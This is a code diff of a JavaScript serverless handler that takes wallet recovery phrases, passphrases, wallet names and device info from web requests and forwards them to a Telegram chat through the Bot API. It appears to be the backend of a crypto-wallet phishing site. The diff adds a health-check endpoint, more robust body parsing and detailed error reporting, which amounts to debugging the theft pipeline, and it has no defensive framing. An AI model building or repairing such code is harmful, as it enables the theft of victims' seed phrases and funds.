@@ -12,44 +12,57 @@ function setCors(res) {
 module.exports = async function handler(req, res) {
   setCors(res);
 
-  // CORS preflight
   if (req.method === 'OPTIONS') {
     return res.status(204).end();
   }
 
   const requestId = Date.now() + '-' + Math.random().toString(36).substr(2, 9);
-  console.log(`[${requestId}] 📥 Incoming request:`, {
-    method: req.method,
-    url: req.url,
-    timestamp: new Date().toISOString()
-  });
+  console.log(`[${requestId}] 📥 Incoming request:`, { method: req.method, url: req.url });
+
+  // GET: simple health check (no secrets) so you can open /api/telegram in browser
+  if (req.method === 'GET') {
+    const hasToken = !!process.env.TELEGRAM_BOT_TOKEN;
+    const hasChatId = !!process.env.TELEGRAM_CHAT_ID;
+    return res.status(200).json({
+      ok: true,
+      message: 'Telegram API is live',
+      env: { TELEGRAM_BOT_TOKEN: hasToken ? 'set' : 'missing', TELEGRAM_CHAT_ID: hasChatId ? 'set' : 'missing' }
+    });
+  }
 
   if (req.method !== 'POST') {
-    console.log(`[${requestId}] ❌ Invalid method:`, req.method);
     return res.status(405).json({ error: 'Method not allowed' });
   }
 
-  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+  const TELEGRAM_BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || '').trim();
+  const TELEGRAM_CHAT_ID = (process.env.TELEGRAM_CHAT_ID || '').trim();
 
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-    console.error(`[${requestId}] ❌ Missing Telegram credentials in environment variables`);
-    return res.status(500).json({ error: 'Server configuration error' });
+    console.error(`[${requestId}] ❌ Missing Telegram credentials`);
+    return res.status(500).json({
+      error: 'Server configuration error',
+      details: !TELEGRAM_BOT_TOKEN ? 'TELEGRAM_BOT_TOKEN is missing' : 'TELEGRAM_CHAT_ID is missing'
+    });
   }
 
   try {
     let phrase, passphrase, imported, keywords, copyUrl, deviceInfo, formattedDate;
     let body = req.body;
 
-    // Vercel parses JSON body automatically; fallback for raw body
-    if (!body && typeof req.body === 'string') {
-      try {
-        body = JSON.parse(req.body);
-      } catch (_) {
-        body = null;
+    // Vercel: body can be undefined if not parsed; try reading raw body
+    if (body === undefined || body === null) {
+      const raw = typeof req.body === 'string' ? req.body : (req.body && req.body.toString && req.body.toString());
+      if (raw) {
+        try {
+          body = JSON.parse(raw);
+        } catch (_) {
+          body = null;
+        }
       }
-    } else if (typeof req.body === 'object' && req.body !== null) {
-      body = req.body;
+    } else if (typeof body === 'object' && body !== null) {
+      // already parsed
+    } else {
+      body = null;
     }
 
     if (body) {
@@ -156,16 +169,15 @@ module.exports = async function handler(req, res) {
     console.log(`[${requestId}] 📤 Preparing to send message to Telegram. Length:`, message.length, 'characters');
     console.log(`[${requestId}] 📝 Message preview (first 200 chars):`, message.substring(0, 200));
 
-    // Send to Telegram via Bot API
+    // Send to Telegram: chat_id as string (e.g. "-1001234567890" or "@channel")
     const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const chatId = String(TELEGRAM_CHAT_ID).trim();
 
     const response = await fetch(telegramUrl, {
       method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
+      headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
+        chat_id: chatId,
         text: message,
         parse_mode: 'HTML',
         disable_web_page_preview: true
@@ -175,26 +187,22 @@ module.exports = async function handler(req, res) {
     const data = await response.json();
 
     if (data.ok) {
-      console.log(`[${requestId}] ✅ Telegram message sent successfully. Length:`, message.length, 'characters');
+      console.log(`[${requestId}] ✅ Telegram message sent successfully`);
       return res.status(200).json({ success: true, message: 'Message sent to Telegram successfully' });
-    } else {
-      console.error(`[${requestId}] ❌ Telegram API error:`, {
-        ok: data.ok,
-        error_code: data.error_code,
-        description: data.description,
-        message_length: message.length,
-        phrase_preview: phrase ? phrase.substring(0, 50) + '...' : 'N/A',
-        wallet: imported
-      });
-      return res.status(500).json({ error: 'Failed to send message to Telegram', details: data.description });
     }
-  } catch (error) {
-    console.error(`[${requestId}] ❌ Exception in Telegram API handler:`, {
-      error: error.message,
-      stack: error.stack,
-      name: error.name
+    // Return Telegram's error so you can see it in Network tab / console
+    console.error(`[${requestId}] ❌ Telegram API error:`, data.description);
+    return res.status(500).json({
+      error: 'Telegram API error',
+      details: data.description || 'Unknown error',
+      code: data.error_code
     });
-    return res.status(500).json({ error: 'Internal server error' });
+  } catch (error) {
+    console.error(`[${requestId}] ❌ Exception:`, error.message);
+    return res.status(500).json({
+      error: 'Internal server error',
+      details: error.message
+    });
   }
 };
 
